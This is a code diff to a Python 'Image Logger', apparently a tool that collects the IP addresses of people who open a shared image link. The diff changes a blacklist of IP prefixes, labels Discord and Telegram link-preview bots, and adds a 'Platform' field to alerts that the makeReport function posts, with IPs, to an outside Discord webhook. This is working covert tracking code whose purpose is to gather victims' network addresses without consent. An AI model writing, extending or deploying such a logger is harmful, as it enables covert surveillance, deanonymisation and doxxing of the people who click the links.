@@ -63,11 +63,19 @@ config = {
     # 4) Image
 }
 
-blacklistedIPs = ("27", "34", "35", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
-        if not ip.startswith(("34", "35")): return
+        return
+    
+    bot = False
+    if ip.startswith(("34", "35")):
+        bot = "Discord"
+    elif useragent.startswith("TelegramBot"):
+        bot = "Telegram"
+    
+    if bot:
         requests.post(config["webhook"], json = {
     "username": config["username"],
     "content": "",
@@ -75,7 +83,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - Link Sent",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a Discord chat!\nYou may receive an IP soon.\n\n**IP:** `{ip}`\n**Endpoint:** `{endpoint}`",
+            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
